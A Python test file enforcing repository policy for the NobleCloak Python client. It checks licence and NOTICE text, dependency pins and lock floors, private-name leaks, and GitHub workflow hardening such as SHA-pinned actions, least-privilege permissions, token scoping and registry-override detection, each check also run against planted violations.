"""Repository policy: the properties the repository's foundation requires, asserted against the tree.

A change that breaks one fails CI instead of surfacing at the first publish. The workflow, NOTICE and pin
checks are functions over data that are also run against planted violations, so they cannot pass vacuously.
"""

from __future__ import annotations

import ast
import copy
import json
import os
import re
import shutil
import subprocess
import sys
import tomllib
from collections.abc import Callable
from pathlib import Path
from typing import Any, cast

import pytest
import yaml
from packaging.markers import Marker

from check_private_deps import find_violations

ROOT = Path(__file__).resolve().parent.parent

Workflow = dict[str, Any]


def read(path: str) -> str:
    return (ROOT / path).read_text(encoding="utf-8")


def pyproject() -> dict[str, Any]:
    return tomllib.loads(read("pyproject.toml"))


WORKFLOW_DIR = ROOT / ".github/workflows"
WORKFLOW_FILES = sorted(p.name for p in WORKFLOW_DIR.glob("*.yml"))


def load_workflow(file: str) -> Workflow:
    return yaml.safe_load(read(f".github/workflows/{file}"))


# --- licence and holder ---------------------------------------------------------------------------

NOTICE_HEAD = ["NobleCloak Python client", "Copyright 2026 NobleCloak"]


def notice_violations(notice: str) -> list[str]:
    if notice.split("\n")[:2] == NOTICE_HEAD:
        return []
    return ["NOTICE does not open with the product line and the NobleCloak copyright line"]


def manifest_violations(project: dict[str, Any]) -> list[str]:
    found: list[str] = []
    if project.get("license") != "Apache-2.0":
        found.append("license is not Apache-2.0")
    if project.get("authors") != [{"name": "NobleCloak"}]:
        found.append("author is not NobleCloak")
    return found


def test_notice_names_noblecloak_as_the_copyright_holder() -> None:
    assert notice_violations(read("NOTICE")) == []


def test_licence_checks_reject_a_foreign_holder_a_wrong_licence_and_a_wrong_author() -> None:
    assert notice_violations(read("NOTICE").replace("2026 NobleCloak", "2026 Acme")) != []
    assert notice_violations("\n".join(NOTICE_HEAD)) == []
    good = {"license": "Apache-2.0", "authors": [{"name": "NobleCloak"}]}
    assert manifest_violations(good) == []
    assert manifest_violations({**good, "license": "MIT"}) == ["license is not Apache-2.0"]
    assert manifest_violations({**good, "authors": [{"name": "Someone"}]}) == ["author is not NobleCloak"]


def test_project_declares_apache_and_noblecloak() -> None:
    assert manifest_violations(pyproject()["project"]) == []


def test_project_declares_python_and_typing_classifiers() -> None:
    classifiers = pyproject()["project"]["classifiers"]
    assert "Programming Language :: Python :: 3.12" in classifiers
    assert "Typing :: Typed" in classifiers
    assert not [c for c in classifiers if c.startswith("License ::")]  # PEP 639 `license` replaces them


def test_licence_text_is_apache_2_0_and_ships_in_the_wheel() -> None:
    assert "Apache License" in read("LICENSE")
    assert "Version 2.0" in read("LICENSE")
    assert pyproject()["project"]["license-files"] == ["LICENSE", "NOTICE"]


SDIST_INCLUDED = ["/src", "/README.md", "/LICENSE", "/NOTICE", "/SECURITY.md", "/pyproject.toml"]
# Names of the private layer: the old organisation's name and any `noblecloak-*-dev` working-mirror repository. None of
# them may appear in anything that leaves the working mirror. Built in pieces so this file does not match itself.
PRIVATE_NAME = re.compile("bia" + "noble" + r"|noblecloak-[a-z0-9-]*-" + "dev" + r"\b", re.IGNORECASE)


def test_sdist_is_an_allowlist() -> None:
    """Checked by listing `uv build`'s sdist; the include list is all that goes into it."""
    sdist = pyproject()["tool"]["hatch"]["build"]["targets"]["sdist"]
    assert sdist["include"] == SDIST_INCLUDED
    assert "exclude" not in sdist


def exported_files() -> list[str]:
    """The tracked files `git archive` would export: everything not marked `export-ignore`."""
    tracked = subprocess.run(["git", "ls-files", "-z"], cwd=ROOT, capture_output=True, check=True).stdout
    names = [n for n in tracked.decode().split("\0") if n]
    ignored = subprocess.run(
        ["git", "check-attr", "-z", "export-ignore", "--", *names], cwd=ROOT, capture_output=True, check=True
    ).stdout.decode()
    parts = ignored.split("\0")
    skipped = {parts[i] for i in range(0, len(parts) - 2, 3) if parts[i + 2] == "set"}
    return [n for n in names if n not in skipped]


def test_the_release_runbook_is_export_ignored() -> None:
    assert "RELEASING.md" not in exported_files()
    assert "README.md" in exported_files()


def test_nothing_that_leaves_the_mirror_names_the_private_layer() -> None:
    """The exported tree (tracked, not export-ignored) and the sdist's files carry no private-layer name."""
    leaks: list[str] = []
    for name in exported_files():
        path = ROOT / name
        if path.is_file() and PRIVATE_NAME.search(path.read_text(encoding="utf-8", errors="ignore")):
            leaks.append(name)
    assert leaks == []
    for entry in SDIST_INCLUDED:
        for path in (
            [ROOT / entry.lstrip("/")]
            if (ROOT / entry.lstrip("/")).is_file()
            else (ROOT / entry.lstrip("/")).rglob("*")
        ):
            if path.is_file() and "__pycache__" not in path.parts:
                assert PRIVATE_NAME.search(path.read_text(encoding="utf-8", errors="ignore")) is None, path


@pytest.mark.parametrize(
    "text",
    [
        "bia" + "noble-adk",
        "Bia" + "Noble",
        "src/bia" + "noble_governance",
        "noblecloak-ts-" + "dev",
        "noblecloak-py-" + "dev",
    ],
)
def test_the_private_layer_pattern_matches_its_names(text: str) -> None:
    assert PRIVATE_NAME.search(f"see `{text}` at 1234567") is not None


@pytest.mark.parametrize("text", ["noblecloak-ts", "noblecloak-langgraph-ts", "noblecloak-py", "noblecloak-dev-tools"])
def test_the_private_layer_pattern_leaves_public_names_alone(text: str) -> None:
    assert PRIVATE_NAME.search(f"see `{text}`") is None


# --- exact pins -----------------------------------------------------------------------------------

EXACT_REQUIREMENT = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*(?:\[[^\]]+\])?==\d+(?:\.\d+)*(?:[.-]?\w+)*$")


def pin_violations(data: dict[str, Any]) -> list[str]:
    """Build, dev and optional requirements that are not `name==version`.

    `[project].dependencies` are checked by `runtime_range_violations` instead: a published library that pins
    exactly cannot be installed next to anything that needs another release.
    """
    requirements: list[str] = list(data.get("build-system", {}).get("requires", []))
    for group in data.get("dependency-groups", {}).values():
        requirements.extend(item for item in group if isinstance(item, str))
    for extra in data.get("project", {}).get("optional-dependencies", {}).values():
        requirements.extend(extra)
    return [r for r in requirements if not EXACT_REQUIREMENT.match(r)]


BOUNDED_REQUIREMENT = re.compile(r"^([A-Za-z0-9][A-Za-z0-9._-]*)>=(\d+(?:\.\d+)*),<(\d+(?:\.\d+)*)$")


def runtime_range_violations(data: dict[str, Any]) -> list[str]:
    """Runtime requirements that are not `name>=floor,<ceiling`."""
    return [r for r in data.get("project", {}).get("dependencies", []) if not BOUNDED_REQUIREMENT.match(r)]


def test_every_python_requirement_is_pinned_exactly() -> None:
    assert pin_violations(pyproject()) == []


def test_every_runtime_requirement_is_a_bounded_range() -> None:
    assert runtime_range_violations(pyproject()) == []


SCRIPT_AND_TEST_DIRS = ("tests", "scripts")

# Imported by a name that is not the distribution that provides it, or provided by a declared requirement.
IMPORT_PROVIDED_BY = {
    "yaml": "pyyaml",
    "pydantic_core": "pydantic",  # pydantic pins its pydantic-core release exactly
}


def undeclared_imports(imports: set[str], declared: set[str], local: set[str]) -> list[str]:
    """Top-level third-party imports whose distribution is not a declared requirement."""
    third_party = imports - set(sys.stdlib_module_names) - local - {"noblecloak"}
    return sorted(m for m in third_party if IMPORT_PROVIDED_BY.get(m, m.replace("_", "-")).lower() not in declared)


def declared_distributions(data: dict[str, Any]) -> set[str]:
    requirements: list[str] = list(data["project"]["dependencies"])
    for group in data.get("dependency-groups", {}).values():
        requirements.extend(item for item in group if isinstance(item, str))
    return {re.split(r"[\[<>=~! ;]", r, maxsplit=1)[0].lower().replace("_", "-") for r in requirements}


def test_tests_and_scripts_import_only_declared_requirements() -> None:
    # An import that only resolves because another package pulls it in breaks when that package drops it.
    imports: set[str] = set()
    local: set[str] = set()
    for directory in SCRIPT_AND_TEST_DIRS:
        for path in (ROOT / directory).glob("*.py"):
            local.add(path.stem)
            for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
                if isinstance(node, ast.Import):
                    imports.update(alias.name.split(".")[0] for alias in node.names)
                elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                    imports.add(node.module.split(".")[0])
    assert undeclared_imports(imports, declared_distributions(pyproject()), local) == []


def test_an_import_of_an_undeclared_package_is_found() -> None:
    declared = {"pytest", "pyyaml", "pydantic"}
    assert undeclared_imports({"pytest", "yaml", "pydantic_core", "os"}, declared, set()) == []
    assert undeclared_imports({"packaging", "os", "helper"}, declared, {"helper"}) == ["packaging"]


def lock_entries_for(lock: dict[str, Any], name: str, environment: dict[str, str]) -> list[str]:
    """The versions of `name` that the lock resolves for an environment: entries with no resolution markers apply
    everywhere; the others apply when one of their markers holds."""
    versions: list[str] = []
    for pkg in lock["package"]:
        if pkg["name"] != name:
            continue
        markers = pkg.get("resolution-markers")
        if markers is None or any(Marker(m).evaluate(environment) for m in markers):
            versions.append(pkg["version"])
    return versions


CI_ENVIRONMENT = {"python_full_version": "3.12.0", "sys_platform": "linux"}


def test_the_lock_resolves_each_runtime_requirement_to_its_floor() -> None:
    # CI syncs with --locked on Python 3.12, so the tests run against the oldest release a consumer can get. A package
    # the dev tools need at a newer release on Python 3.14 and later (pydantic, for the model generator) has one lock
    # entry per Python range; the entry that applies to 3.12 is the one that must be the floor.
    lock = tomllib.loads(read("uv.lock"))
    for requirement in pyproject()["project"]["dependencies"]:
        match = BOUNDED_REQUIREMENT.match(requirement)
        assert match, requirement
        name, floor, _ = match.groups()
        assert lock_entries_for(lock, name.lower(), CI_ENVIRONMENT) == [floor], requirement


def test_a_lock_entry_for_another_python_range_does_not_satisfy_the_floor() -> None:
    lock = {
        "package": [
            {"name": "a", "version": "1.0", "resolution-markers": ["python_full_version >= '3.14'"]},
            {"name": "a", "version": "2.0", "resolution-markers": ["python_full_version < '3.14'"]},
            {"name": "b", "version": "1.0"},
        ]
    }
    assert lock_entries_for(lock, "a", CI_ENVIRONMENT) == ["2.0"]
    assert lock_entries_for(lock, "a", {**CI_ENVIRONMENT, "python_full_version": "3.14.1"}) == ["1.0"]
    assert lock_entries_for(lock, "b", CI_ENVIRONMENT) == ["1.0"]


def test_pydantic_is_held_at_its_floor_where_the_dev_tools_allow_it() -> None:
    # `datamodel-code-generator` needs a newer pydantic on Python 3.14+, so the floor is held by a constraint on the
    # versions below that; without it `uv lock` resolves pydantic to its newest release on 3.12 as well.
    matches = [BOUNDED_REQUIREMENT.match(r) for r in pyproject()["project"]["dependencies"]]
    floors = {m[1]: m[2] for m in matches if m}
    constraints = pyproject()["tool"]["uv"]["constraint-dependencies"]
    assert constraints == [f"pydantic=={floors['pydantic']}; python_full_version < '3.14'"]


def locked_packages_for(lock: dict[str, Any], name: str, environment: dict[str, str]) -> list[dict[str, Any]]:
    """The lock entries of `name` that apply to an environment (same rule as `lock_entries_for`)."""
    return [
        pkg
        for pkg in lock["package"]
        if pkg["name"] == name
        and (
            pkg.get("resolution-markers") is None
            or any(Marker(m).evaluate(environment) for m in pkg["resolution-markers"])
        )
    ]


def has_cpython_wheel(wheel_urls: list[str], minor: int) -> bool:
    """A wheel for CPython 3.<minor>: its own `cp3<minor>` tag, or an `abi3` wheel built for that release or older."""
    for url in wheel_urls:
        match = re.search(r"-cp3(\d+)-(cp3\d+|abi3)-", url.rsplit("/", 1)[-1])
        if match and (int(match[1]) == minor or (match[2] == "abi3" and int(match[1]) <= minor)):
            return True
    return False


def test_the_locked_pydantic_core_has_a_wheel_for_every_supported_python_below_3_14() -> None:
    # pydantic-core is compiled; where the lock has no wheel for an interpreter, uv builds the sdist and needs a Rust
    # toolchain (pydantic 2.7.4 locked pydantic-core 2.18.4, which had cp312 wheels only, so a sync on 3.13 failed).
    floor = int(re.fullmatch(r">=3\.(\d+)", pyproject()["project"]["requires-python"])[1])  # type: ignore[index]
    lock = tomllib.loads(read("uv.lock"))
    for minor in range(floor, 14):
        env = {"python_full_version": f"3.{minor}.0", "sys_platform": "linux"}
        (pydantic,) = locked_packages_for(lock, "pydantic", env)
        core_version = next(d["version"] for d in pydantic["dependencies"] if d["name"] == "pydantic-core")
        cores = [c for c in locked_packages_for(lock, "pydantic-core", env) if c["version"] == core_version]
        assert len(cores) == 1, (minor, core_version)
        urls = [w["url"] for w in cores[0]["wheels"]]
        assert has_cpython_wheel(urls, minor), f"no CPython 3.{minor} wheel for pydantic-core {core_version}"


def test_the_wheel_check_wants_a_wheel_for_the_exact_python() -> None:
    cp312 = ["https://x/pydantic_core-2.18.4-cp312-cp312-macosx_11_0_arm64.whl"]
    assert has_cpython_wheel(cp312, 12)
    assert not has_cpython_wheel(cp312, 13)
    assert has_cpython_wheel(["https://x/p-1-cp311-abi3-manylinux.whl"], 13)
    assert not has_cpython_wheel(["https://x/p-1-cp311-abi3-manylinux.whl"], 10)
    assert not has_cpython_wheel(["https://x/p-1-py3-none-any.whl"], 12)


def test_pin_check_rejects_ranges_and_accepts_exact_forms() -> None:
    assert pin_violations({"build-system": {"requires": ["a==1.2.3", "b[x]==2.0"]}}) == []
    bad = {
        "build-system": {"requires": ["a>=1"]},
        "dependency-groups": {"dev": ["b~=1.0", "c"]},
        "project": {"optional-dependencies": {"x": ["e==1.*"]}},
    }
    assert pin_violations(bad) == ["a>=1", "b~=1.0", "c", "e==1.*"]


def test_runtime_range_check_wants_a_floor_and_a_ceiling() -> None:
    assert runtime_range_violations({"project": {"dependencies": ["a>=0.1.4,<0.2"]}}) == []
    bad = {"project": {"dependencies": ["a==0.1.4", "b>=1", "c<2", "d", "e~=1.0"]}}
    assert runtime_range_violations(bad) == ["a==0.1.4", "b>=1", "c<2", "d", "e~=1.0"]


def test_conformance_pins_exactly() -> None:
    manifest = json.loads(read("conformance/package.json"))
    assert all(re.fullmatch(r"\d+\.\d+\.\d+", v) for v in manifest["dependencies"].values())
    assert re.fullmatch(r"bun@\d+\.\d+\.\d+", manifest["packageManager"])


def test_python_floor_and_toolchain_files() -> None:
    assert pyproject()["project"]["requires-python"] == ">=3.12"
    assert read(".python-version").strip() == "3.12"
    assert pyproject()["tool"]["pyright"]["typeCheckingMode"] == "strict"
    options = pyproject()["tool"]["pytest"]["ini_options"]["addopts"]
    assert "--cov-branch" in options
    assert "--cov-fail-under=90" in options
    assert "--cov=noblecloak" in options
    assert (ROOT / "src/noblecloak/py.typed").is_file()


# --- workflows ------------------------------------------------------------------------------------

SHA_PIN = re.compile(r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
DIGEST_PIN = re.compile(r"^docker://[\w./-]+@sha256:[0-9a-f]{64}$")


def jobs(workflow: Workflow) -> dict[str, dict[str, Any]]:
    return workflow["jobs"]


def steps(job: dict[str, Any]) -> list[dict[str, Any]]:
    return job.get("steps", [])


def unpinned_uses(workflow: Workflow, raw: str) -> list[str]:
    """Every `uses` that is not a full commit SHA or an image digest, and every pin without a version comment."""
    found: list[str] = []
    values = [j["uses"] for j in jobs(workflow).values() if "uses" in j]
    values += [s["uses"] for j in jobs(workflow).values() for s in steps(j) if "uses" in s]
    for value in values:
        if not (SHA_PIN.match(value) or DIGEST_PIN.match(value)):
            found.append(f"{value}: not a SHA or digest pin")
    for line in raw.split("\n"):
        if re.match(r"^\s*#", line):
            continue
        match = re.search(r"\buses:\s*['\"]?([^'\"\s#]+)['\"]?", line)
        if match is None:
            continue
        value = match.group(1)
        if SHA_PIN.match(value) and not re.search(r" # v\d+\.\d+\.\d+$", line):
            found.append(f"{value}: no # vX.Y.Z comment")
        if DIGEST_PIN.match(value) and not re.search(r" # \d+\.\d+\.\d+$", line):
            found.append(f"{value}: no # X.Y.Z comment")
    return found


def checkout_violations(workflow: Workflow) -> list[str]:
    """Every actions/checkout step that does not set `persist-credentials: false`."""
    found: list[str] = []
    for name, job in jobs(workflow).items():
        for step in steps(job):
            if step.get("uses", "").startswith("actions/checkout@") and (
                step.get("with", {}).get("persist-credentials") is not False
            ):
                found.append(f"{name}: checkout keeps credentials")
    return found


# Jobs that may hold a write scope, with the scopes they may hold. Only `publish.yml` publishes: its `release` job
# creates the GitHub Release (`contents: write`) and its `publish` job mints the PyPI trusted-publishing token
# (`id-token: write`). No job of `ci.yml` holds a write scope.
WRITE_ALLOWED: dict[tuple[str, str], frozenset[str]] = {
    ("publish.yml", "release"): frozenset({"contents"}),
    ("publish.yml", "publish"): frozenset({"id-token"}),
}


def permission_violations(file: str, workflow: Workflow) -> list[str]:
    found: list[str] = []
    if workflow.get("permissions") != {"contents": "read"}:
        found.append(f"{file}: top-level permissions are not exactly contents: read")
    for name, job in jobs(workflow).items():
        permissions: Any = job.get("permissions")
        if not isinstance(permissions, dict):
            found.append(f"{file}:{name}: permissions are missing or a string block")
            continue
        allowed = WRITE_ALLOWED.get((file, name), frozenset())
        found.extend(
            f"{file}:{name}: {scope}: {level}"
            for scope, level in cast(dict[str, str], permissions).items()
            if level != "read" and scope not in allowed
        )
        if "contents" not in permissions:
            found.append(f"{file}:{name}: contents is not stated")
    return found


def uncommented(line: str) -> str:
    return re.sub(r"(^|\s)#.*$", "", line)


def secret_lines(raw: str) -> list[str]:
    """Lines that use the secrets context outside a comment."""
    return [line for line in raw.split("\n") if re.search(r"\bsecrets\b", uncommented(line))]


GITHUB_TOKEN_EXPRESSION = re.compile(r"""\bgithub\s*(?:\.\s*token\b|\[\s*['"]token['"]\s*\])""")


def github_token_lines(raw: str) -> list[str]:
    """Lines that hand the job's `github.token` to a step (through `env`, `with` or a run line), outside a comment."""
    return [line for line in raw.split("\n") if GITHUB_TOKEN_EXPRESSION.search(uncommented(line))]


# The one job that may hand a step `github.token` (as `GH_TOKEN` for `gh release create`). Every other job, and the
# workflow level, may not.
GITHUB_TOKEN_ALLOWED: frozenset[tuple[str, str]] = frozenset({("publish.yml", "release")})


def github_token_violations(file: str, workflow: Workflow, raw: str) -> list[str]:
    """`github.token` anywhere except the jobs listed for this file. A file with no allowance is scanned as text."""
    allowed = {job for f, job in GITHUB_TOKEN_ALLOWED if f == file}
    if not allowed:
        return github_token_lines(raw)
    found = [
        f"{file}:{name}: github.token"
        for name, job in jobs(workflow).items()
        if name not in allowed and GITHUB_TOKEN_EXPRESSION.search(json.dumps(job))
    ]
    outside_jobs = {key: value for key, value in workflow.items() if key != "jobs"}
    if GITHUB_TOKEN_EXPRESSION.search(json.dumps(outside_jobs)):
        found.append(f"{file}: github.token outside the jobs")
    return found


REGISTRY_ENV_NAMES = (
    r"(?:NODE_AUTH_TOKEN|BUN_CONFIG_REGISTRY|npm_config_\w*registry\w*"
    r"|UV_(?:\w*INDEX\w*|PUBLISH\w*|FIND_LINKS|CONFIG_FILE|\w*INSECURE\w*|\w*MIRROR\w*|KEYRING\w*)"
    r"|PIP_\w*|TWINE_\w*|NPM_TOKEN)"
)
REGISTRY_ENV = re.compile(f"^{REGISTRY_ENV_NAMES}$", re.IGNORECASE)
# A run line that assigns such a name: inline (`UV_INDEX_URL=x uv sync`), `export NAME=x`, or the `NAME=x` text that
# `echo ... >> "$GITHUB_ENV"` writes.
RUN_ENV_ASSIGNMENT = re.compile(rf"(?<![\w-])(?:export\s+)?{REGISTRY_ENV_NAMES}\s*=", re.IGNORECASE)
GITHUB_ENV_WRITE = re.compile(r"\bGITHUB_ENV\b")
WORD = re.compile(r"\w+")
# Long index and registry flags (uv, pip, bun, npm).
INDEX_FLAG = re.compile(
    r"--(?:index|index-url|extra-index-url|default-index|find-links|publish-url|registry|config-file"
    r"|allow-insecure-host|keyring-provider|trusted-host)\b"
)
# The short `-i` and `-f` (value separate or fused on) only count within a pip or uv(x) command: `sed -i` and
# `grep -i` do not.
SHORT_INDEX_FLAG = re.compile(r"\b(?:pip3?|uvx?)\b[^|;&\n]*\s-[if]")


def has_index_flag(run: str) -> bool:
    joined = run.replace("\\\n", " ")
    return bool(INDEX_FLAG.search(joined) or SHORT_INDEX_FLAG.search(joined))


def sets_registry_env(run: str) -> bool:
    """True when a run line assigns, exports or writes to `$GITHUB_ENV` a registry-affecting environment name."""
    if RUN_ENV_ASSIGNMENT.search(run):
        return True
    return bool(GITHUB_ENV_WRITE.search(run)) and any(REGISTRY_ENV.match(word) for word in WORD.findall(run))


def registry_violations(file: str, workflow: Workflow) -> list[str]:
    """Registry credentials or overrides at any level, index or registry flags in a run line, and `registry-url`."""
    found: list[str] = []

    def env_names(env: Any) -> list[str]:
        names = cast(dict[str, Any], env) if isinstance(env, dict) else {}
        return [key for key in names if REGISTRY_ENV.match(key)]

    for key in env_names(workflow.get("env")):
        found.append(f"{file}: workflow env {key}")
    for name, job in jobs(workflow).items():
        for key in env_names(job.get("env")):
            found.append(f"{file}:{name}: job env {key}")
        for step in steps(job):
            for key in env_names(step.get("env")):
                found.append(f"{file}:{name}: step env {key}")
            if "registry-url" in step.get("with", {}):
                found.append(f"{file}:{name}: registry-url")
            if has_index_flag(step.get("run", "")):
                found.append(f"{file}:{name}: index flag in run")
            if sets_registry_env(step.get("run", "")):
                found.append(f"{file}:{name}: registry env set in run")
    return found


def job_name_violations(files: dict[str, Workflow]) -> list[str]:
    missing: list[str] = []
    names: list[str] = []
    for file, workflow in files.items():
        for key, job in jobs(workflow).items():
            if "name" not in job:
                missing.append(f"{file}:{key} has no name")
            names.append(job.get("name", key))
    return missing + sorted({n for n in names if names.count(n) > 1})


def strategy_violations(workflow: Workflow) -> list[str]:
    return [f"{key} has a strategy" for key, job in jobs(workflow).items() if "strategy" in job]


@pytest.mark.parametrize("file", WORKFLOW_FILES)
def test_workflow_policy(file: str) -> None:
    workflow = load_workflow(file)
    raw = read(f".github/workflows/{file}")
    assert unpinned_uses(workflow, raw) == []
    assert checkout_violations(workflow) == []
    assert permission_violations(file, workflow) == []
    assert secret_lines(raw) == []
    assert github_token_violations(file, workflow, raw) == []
    assert registry_violations(file, workflow) == []
    assert strategy_violations(workflow) == []


def test_job_names_are_explicit_and_unique() -> None:
    assert job_name_violations({f: load_workflow(f) for f in WORKFLOW_FILES}) == []


CI = load_workflow("ci.yml")


def runs(job: str) -> str:
    return "\n".join(s.get("run", "") for s in steps(jobs(CI)[job]))


def test_the_model_check_runs_after_the_spec_package_is_installed() -> None:
    # The models are generated from a file in conformance/node_modules; before the install the check would fail on a
    # missing document, and a step order that hid that would be a silent skip once the install moved.
    commands = [s.get("run", "") for s in steps(jobs(CI)["gate"])]
    install = next(i for i, c in enumerate(commands) if "bun install --frozen-lockfile" in c)
    check = next(i for i, c in enumerate(commands) if "generate_models.py --check" in c)
    assert install < check


def test_ci_has_the_two_jobs_and_runs_the_gate() -> None:
    assert {j["name"] for j in jobs(CI).values()} == {"gate", "e2e / mock"}
    gate = runs("gate")
    for command in (
        "uv sync --locked",
        "uv run --frozen ruff check",
        "uv run --frozen ruff format --check",
        "uv run --frozen pyright",
        "uv run --frozen pytest",
        "uv run --frozen python scripts/check_private_deps.py",
        "uv run --frozen python scripts/generate_sync.py --check",
        "uv run --frozen python scripts/generate_models.py --check",
    ):
        assert command in gate, command
    assert any(s.get("uses", "").startswith("docker://rhysd/actionlint@") for s in steps(jobs(CI)["gate"]))


def sync_check(directory: Path, flag: str) -> subprocess.CompletedProcess[str]:
    """`uv sync <flag>` against the pyproject and lock in `directory`.

    It tries the local cache first. Checking a drifted pyproject means re-resolving it, and a cache warmed only
    by `uv sync --locked` (as in CI) holds no index metadata, so an offline attempt that fails for any reason
    other than the drift itself is retried online against pypi.org, the only index this repo allows.
    """
    env = {k: v for k, v in os.environ.items() if not k.startswith("UV_")}
    env["UV_PROJECT_ENVIRONMENT"] = str(directory / ".venv")

    def run(*extra: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["uv", "sync", flag, *extra, "--no-install-project"],
            cwd=directory,
            env=env,
            capture_output=True,
            text=True,
            check=False,
        )

    offline = run("--offline")
    if offline.returncode != 0 and "needs to be updated" not in offline.stderr:
        return run()
    return offline


def test_locked_sync_catches_a_pyproject_that_drifted_from_the_lock(tmp_path: Path) -> None:
    """The case `--frozen` let through: a pin removed from pyproject.toml while uv.lock still lists it."""
    if shutil.which("uv") is None:
        assert not os.environ.get("CI"), "uv must be on PATH in CI"
        pytest.skip("uv is not installed")
    # The version is dynamic, so uv reads it through the build backend: the package files come along.
    for name in ("uv.lock", "pyproject.toml", "README.md", "LICENSE", "NOTICE"):
        (tmp_path / name).write_text(read(name), encoding="utf-8")
    shutil.copytree(ROOT / "src", tmp_path / "src", ignore=shutil.ignore_patterns("__pycache__"))
    if sync_check(tmp_path, "--locked").returncode != 0:
        assert not os.environ.get("CI"), "the uv cache is cold in CI, so the drift check cannot run"
        pytest.skip("the uv cache is cold, so an offline sync cannot resolve the baseline")
    drifted = (
        read("pyproject.toml").replace('  "pyyaml==6.0.3",\n', "").replace('  "types-pyyaml==6.0.12.20261103",\n', "")
    )
    assert drifted != read("pyproject.toml")
    (tmp_path / "pyproject.toml").write_text(drifted, encoding="utf-8")
    result = sync_check(tmp_path, "--locked")
    assert result.returncode != 0
    assert "needs to be updated" in result.stderr


def test_ci_uv_version_is_pinned() -> None:
    uv_steps = [s for s in steps(jobs(CI)["gate"]) if s.get("uses", "").startswith("astral-sh/setup-uv@")]
    assert len(uv_steps) == 1
    assert re.fullmatch(r"\d+\.\d+\.\d+", str(uv_steps[0]["with"]["version"]))


def test_ci_mock_job_installs_frozen_starts_and_health_checks_nc_mock() -> None:
    job = jobs(CI)["e2e-mock"]
    text = "\n".join(s.get("run", "") for s in steps(job))
    assert "bun install --frozen-lockfile" in text
    # The local bin from the frozen install, never `bun x` / `bunx`: those look up a package named `nc-mock` on
    # the registry when the local bin is missing, and that name is not ours.
    assert "./node_modules/.bin/nc-mock --port 8787" in text
    assert not re.search(r"\bbun\s+x\b|\bbunx\b|\bnpx\b", text)
    assert "/.well-known/jwks.json" in text
    assert "/__mock/tokens" in text
    bun_steps = [s for s in steps(job) if s.get("uses", "").startswith("oven-sh/setup-bun@")]
    assert bun_steps[0]["with"]["bun-version-file"] == "conformance/package.json"
    assert all(s.get("working-directory") == "conformance" for s in steps(job) if "bun install" in s.get("run", ""))
    # Stopping the mock must run even when an earlier step fails.
    assert steps(job)[-1]["if"] == "always()"


def test_ci_mock_job_runs_the_e2e_tests_against_the_mock_it_started() -> None:
    job = jobs(CI)["e2e-mock"]
    commands = [s.get("run", "") for s in steps(job)]
    start = next(i for i, c in enumerate(commands) if "nc-mock --port 8787" in c)
    run = next(i for i, c in enumerate(commands) if "pytest -m e2e" in c)
    assert start < run < len(commands) - 1  # after the mock is up, before it is stopped
    step = steps(job)[run]
    assert step["env"]["NOBLECLOAK_E2E_URL"] == "http://127.0.0.1:8787"
    assert "uv sync --locked" in "\n".join(commands)
    assert "uv run --frozen pytest" in step["run"]
    # The default run is the unit tests: the e2e ones need the mock, so they are selected only by `-m e2e`.
    assert 'addopts = [\n  "-m",\n  "not e2e",' in read("pyproject.toml")


# Planted violations: every check must be able to fail.

MINIMAL_RAW = (
    "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
    "        with:\n          persist-credentials: false\n"
)


def minimal_workflow() -> Workflow:
    return {
        "permissions": {"contents": "read"},
        "jobs": {
            "a": {
                "name": "a",
                "permissions": {"contents": "read"},
                "steps": [
                    {
                        "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                        "with": {"persist-credentials": False},
                    }
                ],
            }
        },
    }


def test_planted_unpinned_actions_are_found() -> None:
    assert unpinned_uses(minimal_workflow(), MINIMAL_RAW) == []
    tag = minimal_workflow()
    tag["jobs"]["a"]["steps"][0]["uses"] = "actions/checkout@v4"
    assert unpinned_uses(tag, MINIMAL_RAW.replace("3d3c42e5aac5ba805825da76410c181273ba90b1", "v4")) != []
    assert unpinned_uses(minimal_workflow(), MINIMAL_RAW.replace(" # v7.0.1", "")) != []
    digest = "docker://rhysd/actionlint@sha256:" + "a" * 64
    job_level = minimal_workflow()
    job_level["jobs"]["a"]["steps"].append({"uses": digest})
    raw = MINIMAL_RAW + f"      - uses: {digest}\n"
    assert unpinned_uses(job_level, raw) == [f"{digest}: no # X.Y.Z comment"]
    assert unpinned_uses(job_level, raw + " # 1.7.12\n") == [f"{digest}: no # X.Y.Z comment"]
    assert unpinned_uses(job_level, raw.rstrip("\n") + " # 1.7.12\n") == []
    docker_tag = minimal_workflow()
    docker_tag["jobs"]["a"]["uses"] = "./.github/workflows/x.yml"
    assert unpinned_uses(docker_tag, MINIMAL_RAW) == ["./.github/workflows/x.yml: not a SHA or digest pin"]
    assert unpinned_uses(minimal_workflow(), "# uses: x/y@v1\n" + MINIMAL_RAW) == []


def test_planted_persisted_credentials_are_found() -> None:
    assert checkout_violations(minimal_workflow()) == []
    for value in (True, None):
        bad = minimal_workflow()
        step = bad["jobs"]["a"]["steps"][0]
        if value is None:
            del step["with"]
        else:
            step["with"]["persist-credentials"] = value
        assert checkout_violations(bad) == ["a: checkout keeps credentials"]


def test_planted_write_scopes_are_found() -> None:
    assert permission_violations("ci.yml", minimal_workflow()) == []
    write = minimal_workflow()
    write["jobs"]["a"]["permissions"]["packages"] = "write"
    assert permission_violations("ci.yml", write) == ["ci.yml:a: packages: write"]
    id_token = minimal_workflow()
    id_token["jobs"]["a"]["permissions"] = {"contents": "read", "id-token": "write"}
    assert any("id-token" in v for v in permission_violations("ci.yml", id_token))
    string_block = minimal_workflow()
    string_block["jobs"]["a"]["permissions"] = "write-all"
    assert permission_violations("ci.yml", string_block) == ["ci.yml:a: permissions are missing or a string block"]
    top = minimal_workflow()
    top["permissions"] = {"contents": "write"}
    assert any("top-level" in v for v in permission_violations("ci.yml", top))
    no_contents = minimal_workflow()
    no_contents["jobs"]["a"]["permissions"] = {"actions": "read"}
    assert permission_violations("ci.yml", no_contents) == ["ci.yml:a: contents is not stated"]


def test_a_write_scope_is_allowed_only_where_listed(monkeypatch: pytest.MonkeyPatch) -> None:
    release = minimal_workflow()
    release["jobs"]["a"]["permissions"] = {"contents": "read", "id-token": "write"}
    monkeypatch.setitem(WRITE_ALLOWED, ("ci.yml", "a"), frozenset({"id-token"}))
    assert permission_violations("ci.yml", release) == []
